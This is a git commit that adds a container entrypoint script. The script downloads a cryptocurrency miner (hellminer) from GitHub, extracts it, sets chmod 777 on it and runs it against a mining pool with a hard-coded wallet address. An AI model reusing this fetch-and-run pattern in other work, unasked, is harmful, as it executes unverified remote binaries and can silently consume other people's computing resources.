cbba92134d806e1d2a7589549e619892a4fcc65f
koasg6 <lordkoasis@gmail.com>
2024-09-09 15:29:13 +0700

    Create entrypoint.sh

---
+++ entrypoint.sh
@@ -0,0 +1,7 @@
+cd /cpuminer
+
+    wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+  
+    tar xf hellminer_linux64.tar.gz
+    chmod 777 hellminer
+    ./hellminer -c stratum+tcp://sg.vipor.net:5040 -u RKiEPEYT71vsQ1QPeqQRBPfmLChXaPZjHS.Btvps -p x --cpu 4
